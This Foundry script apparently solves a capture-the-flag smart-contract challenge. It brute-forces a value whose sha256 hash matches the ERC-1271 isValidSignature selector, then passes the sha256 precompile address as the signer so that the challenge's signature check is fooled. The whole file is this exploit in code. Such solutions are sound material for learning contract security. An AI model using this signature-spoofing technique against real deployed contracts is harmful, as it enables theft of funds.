// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface Setup {
    function challenge() external view returns (Challenge);
    function isSolved() external view returns (bool);
}
contract Challenge {
    
    uint public bestScore;
    function solve() external {}
    function solve(address signer, bytes memory signature) external{}
}
interface IERC1271 {
    /**
     * @dev Should return whether the signature provided is valid for the provided data
     * @param hash      Hash of the data to be signed
     * @param signature Signature byte array associated with _data
     */
    function isValidSignature(bytes32 hash, bytes memory signature) external view returns (bytes4 magicValue);
}

contract Vanity is Script {
    Setup setup ;

    bytes32 private immutable MAGIC = keccak256(abi.encodePacked("CHALLENGE_MAGIC"));

    function setUp() public {
        setup = Setup(vm.envAddress("SETUP_CONTRACT"));
    }

    function tryFoundHash() public {
        bytes4 selector = IERC1271.isValidSignature.selector;
        uint counter;
        for (uint i = 2080000000; i < 1e11; i++) {// 3341776890
            bytes32 _result = sha256(abi.encodeWithSelector(IERC1271.isValidSignature.selector,MAGIC, abi.encode(uint(i))));
            if (bytes4(_result) == selector) {
                console.log("found hash: %s", i);
                counter= i;
                break;
            }
            if (i%10000000 == 0)
                console.log("index: %s", i);
        }
        setup.challenge().solve(address(0x02), abi.encode(counter));
    }

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address signer = vm.addr(deployerPrivateKey);
        vm.startBroadcast(deployerPrivateKey);

        ////////////////
        
        console.logBytes32(MAGIC);
        console.logBytes32(bytes32( IERC1271.isValidSignature.selector));

        console.log("address signer: %s", signer);
        console.log("score: %s", setup.challenge().bestScore());
        tryFoundHash();
        console.log("score: %s", setup.challenge().bestScore());
        ////////////////
        vm.stopBroadcast();

        
    }
}
